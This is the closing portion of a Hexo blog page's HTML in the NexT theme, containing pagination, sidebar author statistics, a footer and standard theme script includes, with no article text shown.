        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">fxc233</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">15</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fxc233</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
